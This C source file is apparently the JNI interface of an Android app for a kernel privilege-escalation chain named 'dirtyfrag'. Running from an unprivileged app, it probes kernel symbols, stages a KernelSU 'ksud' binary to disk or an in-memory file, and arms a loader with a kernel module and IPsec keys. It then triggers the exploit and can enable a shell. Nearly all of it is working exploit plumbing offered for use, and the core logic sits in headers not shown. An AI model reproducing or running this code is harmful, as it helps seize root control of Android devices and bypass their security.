/* JNI surface of the dirtyfrag chain for the app host (libgsdfr_app.so).
 * Runs in the untrusted_app process; the SA/teardown are external (IpSecManager). */
#define _GNU_SOURCE
#include <jni.h>

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "dfr_loader.h"
#include "dfr_core.h"
#include "dfr_crypto.h"
#include "dfr_kmi.h"
#include "dfr_pin_probe.h"

typedef struct {
  char buf[8192];
  size_t len;
} out_t;

static void out_fmt(out_t *o, const char *fmt, ...) {
  va_list ap;
  int n;

  if (o->len + 1 >= sizeof(o->buf))
    return;
  va_start(ap, fmt);
  n = vsnprintf(o->buf + o->len, sizeof(o->buf) - o->len, fmt, ap);
  va_end(ap);
  if (n > 0) {
    o->len += (size_t)n;
    if (o->len >= sizeof(o->buf))
      o->len = sizeof(o->buf) - 1;
  }
}

static void out_append(out_t *o, const char *text) {
  out_fmt(o, "%s", text ? text : "");
}

static jstring to_jstring(JNIEnv *env, out_t *o) {
  return (*env)->NewStringUTF(env, o->buf);
}

/* bound to the encap source port and passed to the loader in arm(); closed in finish() */
static int g_sender_fd = -1;

static int sender_open(uint16_t port) {
  struct sockaddr_in a;
  int fd;

  if (g_sender_fd >= 0) {
    close(g_sender_fd);
    g_sender_fd = -1;
  }
  fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0) return -errno;
  memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET;
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  a.sin_port = htons(port);
  if (bind(fd, (const struct sockaddr *)&a, sizeof(a)) < 0) {
    int rc = -errno;
    close(fd);
    return rc;
  }
  g_sender_fd = fd;
  return 0;
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_probe(JNIEnv *env,
                                                            jclass clazz) {
  out_t o = {{0}, 0};
  char kmi[64];
  (void)clazz;

  if (dfr_kmi_current(kmi, sizeof(kmi)) == 0)
    out_fmt(&o, "kmi=%s\n", kmi);
  else
    out_fmt(&o, "kmi=unknown\n");
  out_fmt(&o, "uid=%d pid=%d\n", (int)getuid(), (int)getpid());
  out_fmt(&o, "crypto=%s\n", dfr_crypto_selfcheck() == 0 ? "ok" : "fail");
  return to_jstring(env, &o);
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_pinProbe(JNIEnv *env,
                                                               jclass clazz,
                                                               jstring jdir) {
  out_t o = {{0}, 0};
  struct dfr_pin_result pr;
  struct timespec t0, t1;
  const char *dir;
  double ms;

  (void)clazz;
  if (!jdir) return to_jstring(env, &o);
  dir = (*env)->GetStringUTFChars(env, jdir, NULL);
  if (!dir) return to_jstring(env, &o);

  memset(&pr, 0, sizeof(pr));
  clock_gettime(CLOCK_MONOTONIC, &t0);
  dfr_pin_probe_run(dir, &pr);
  clock_gettime(CLOCK_MONOTONIC, &t1);
  ms = (double)(t1.tv_sec - t0.tv_sec) * 1000.0 +
       (double)(t1.tv_nsec - t0.tv_nsec) / 1e6;
  (*env)->ReleaseStringUTFChars(env, jdir, dir);

  out_fmt(&o, "pin.verdict=%s\n", dfr_pin_verdict_str(pr.verdict));
  if (pr.stage)
    out_fmt(&o, "pin.detail=stage=%s errno=%d rounds=%u pinned=%u copied=%u\n",
            pr.stage, pr.stage_errno, pr.rounds, pr.pinned, pr.copied);
  else
    out_fmt(&o, "pin.detail=rounds=%u pinned=%u copied=%u\n", pr.rounds,
            pr.pinned, pr.copied);
  out_fmt(&o,
          "pin.syms=skb_splice_from_iter=%d ip_append_page=%d udp_sendpage=%d\n",
          pr.sym_splice, pr.sym_append, pr.sym_sendpage);
  out_fmt(&o, "pin.ms=%.0f\n", ms < 0 ? 0.0 : ms);
  return to_jstring(env, &o);
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_kmi(JNIEnv *env,
                                                          jclass clazz) {
  char buf[64];
  (void)clazz;
  buf[0] = 0;
  if (dfr_kmi_current(buf, sizeof(buf)) != 0)
    buf[0] = 0;
  return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jint JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_ksudStage(
    JNIEnv *env, jclass clazz, jstring jpath, jbyteArray jdata) {
  const char *path;
  char tmp[256];
  jbyte *data;
  jsize len, off = 0;
  int fd, rc = 0;
  (void)clazz;

  if (jpath == NULL || jdata == NULL)
    return -1;
  path = (*env)->GetStringUTFChars(env, jpath, NULL);
  if (path == NULL)
    return -1;
  len = (*env)->GetArrayLength(env, jdata);
  if (len <= 0 || strlen(path) > 200) {
    (*env)->ReleaseStringUTFChars(env, jpath, path);
    return -1;
  }
  data = (*env)->GetByteArrayElements(env, jdata, NULL);
  if (data == NULL) {
    (*env)->ReleaseStringUTFChars(env, jpath, path);
    return -1;
  }
  /* publish via temp + rename: the target path never holds a partial blob */
  snprintf(tmp, sizeof(tmp), "%s.t", path);
  fd = open(tmp, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    rc = -errno;
  } else {
    while (off < len) {
      ssize_t n = write(fd, data + off, (size_t)(len - off));
      if (n <= 0) {
        rc = -errno;
        break;
      }
      off += (jsize)n;
    }
    if (rc == 0 && fchmod(fd, 0755) != 0)
      rc = -errno;
    close(fd);
    if (rc == 0 && rename(tmp, path) != 0)
      rc = -errno;
    if (rc != 0)
      unlink(tmp);
  }
  (*env)->ReleaseByteArrayElements(env, jdata, data, JNI_ABORT);
  (*env)->ReleaseStringUTFChars(env, jpath, path);
  return rc;
}

/* arm64 syscall number; older bionic headers may not define it */
#ifndef __NR_memfd_create
#define __NR_memfd_create 279
#endif

/* resident memfd stage for ksud; its /proc/<pid>/fd path is baked via uargs (ksud_src=) */
static int g_ksud_mfd = -1;

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_ksudStageMemfd(
    JNIEnv *env, jclass clazz, jbyteArray jdata) {
  char path[64];
  jbyte *data;
  jsize len, off = 0;
  (void)clazz;

  if (jdata == NULL)
    return (*env)->NewStringUTF(env, "");
  len = (*env)->GetArrayLength(env, jdata);
  if (len <= 0)
    return (*env)->NewStringUTF(env, "");
  data = (*env)->GetByteArrayElements(env, jdata, NULL);
  if (data == NULL)
    return (*env)->NewStringUTF(env, "");
  if (g_ksud_mfd < 0) {
    int fd = (int)syscall(__NR_memfd_create, "ksud", 0);
    if (fd >= 0)
      g_ksud_mfd = fd;
  }
  if (g_ksud_mfd >= 0 &&
      (ftruncate(g_ksud_mfd, 0) != 0 || lseek(g_ksud_mfd, 0, SEEK_SET) < 0)) {
    close(g_ksud_mfd);
    g_ksud_mfd = -1;
  }
  if (g_ksud_mfd >= 0) {
    while (off < len) {
      ssize_t n = write(g_ksud_mfd, data + off, (size_t)(len - off));
      if (n <= 0) {
        close(g_ksud_mfd);
        g_ksud_mfd = -1;
        break;
      }
      off += (jsize)n;
    }
  }
  (*env)->ReleaseByteArrayElements(env, jdata, data, JNI_ABORT);
  if (g_ksud_mfd < 0)
    return (*env)->NewStringUTF(env, "");
  snprintf(path, sizeof(path), "/proc/%d/fd/%d", (int)getpid(), g_ksud_mfd);
  return (*env)->NewStringUTF(env, path);
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_arm(
    JNIEnv *env, jclass clazz, jstring jkmi, jbyteArray jko, jint jspi,
    jint jencap_port, jint jsender_port, jbyteArray jaes, jbyteArray jhmac,
    jstring jksud_path) {
  out_t o = {{0}, 0};
  const char *kmi = NULL, *ksud_path = NULL;
  jbyte *ko = NULL, *aes = NULL, *hmac = NULL;
  jsize ko_len = 0, aes_len = 0, hmac_len = 0;
  char buf[4096];
  int rc;
  (void)clazz;

  if (jkmi != NULL) kmi = (*env)->GetStringUTFChars(env, jkmi, NULL);
  if (jksud_path != NULL)
    ksud_path = (*env)->GetStringUTFChars(env, jksud_path, NULL);
  if (jko != NULL) {
    ko_len = (*env)->GetArrayLength(env, jko);
    ko = (*env)->GetByteArrayElements(env, jko, NULL);
  }
  if (jaes != NULL) {
    aes_len = (*env)->GetArrayLength(env, jaes);
    aes = (*env)->GetByteArrayElements(env, jaes, NULL);
  }
  if (jhmac != NULL) {
    hmac_len = (*env)->GetArrayLength(env, jhmac);
    hmac = (*env)->GetByteArrayElements(env, jhmac, NULL);
  }

  buf[0] = 0;
  if (kmi == NULL || ko == NULL || ko_len <= 0 || aes_len != 32 ||
      hmac_len != 32 || jspi == 0 || jencap_port <= 0 || jsender_port <= 0 ||
      ksud_path == NULL || ksud_path[0] == 0) {
    out_fmt(&o, "status=fail\nnote=bad args\n");
  } else {
    rc = sender_open((uint16_t)jsender_port);
    if (rc) {
      out_fmt(&o, "status=fail\nsender=%s\n", strerror(-rc));
    } else {
      dfr_loader_set_ksud_path(ksud_path);
      dfr_loader_set_external_sa((uint32_t)jspi, (uint16_t)jencap_port,
                             g_sender_fd, (const uint8_t *)aes,
                             (const uint8_t *)hmac);
      /* force re-bake: a stale container from a crashed run must not survive a ko change */
      dfr_loader_set_force_rebake(1);
      dfr_loader_arm(kmi, (const uint8_t *)ko, (size_t)ko_len, buf, sizeof(buf));
      out_append(&o, buf);
    }
  }

  if (ko != NULL) (*env)->ReleaseByteArrayElements(env, jko, ko, JNI_ABORT);
  if (aes != NULL) (*env)->ReleaseByteArrayElements(env, jaes, aes, JNI_ABORT);
  if (hmac != NULL)
    (*env)->ReleaseByteArrayElements(env, jhmac, hmac, JNI_ABORT);
  if (kmi != NULL) (*env)->ReleaseStringUTFChars(env, jkmi, kmi);
  if (ksud_path != NULL)
    (*env)->ReleaseStringUTFChars(env, jksud_path, ksud_path);
  return to_jstring(env, &o);
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_trigger(JNIEnv *env,
                                                              jclass clazz) {
  char buf[4096];
  (void)clazz;
  buf[0] = 0;
  dfr_loader_trigger(buf, sizeof(buf));
  return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_finish(JNIEnv *env,
                                                             jclass clazz,
                                                             jboolean force) {
  char buf[4096];
  (void)clazz;
  buf[0] = 0;
  dfr_loader_finish(force ? 1 : 0, buf, sizeof(buf));
  if (g_sender_fd >= 0) {
    close(g_sender_fd);
    g_sender_fd = -1;
  }
  return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_progress(JNIEnv *env,
                                                               jclass clazz,
                                                               jint op) {
  (void)clazz;
  if (op == 0) {
    dfr_loader_progress_clear();
    return (*env)->NewStringUTF(env, "progress=cleared\n");
  }
  {
    char *buf = dfr_loader_progress_dup();
    jstring s = (*env)->NewStringUTF(env, buf ? buf : "");
    free(buf);
    return s;
  }
}

JNIEXPORT void JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_setAllowShell(
    JNIEnv *env, jclass clazz, jboolean on) {
  (void)env;
  (void)clazz;
  dfr_loader_set_allow_shell(on ? 1 : 0);
}

JNIEXPORT void JNICALL
Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_setSoftReboot(
    JNIEnv *env, jclass clazz, jboolean on) {
  (void)env;
  (void)clazz;
  dfr_loader_set_soft_reboot(on ? 1 : 0);
}
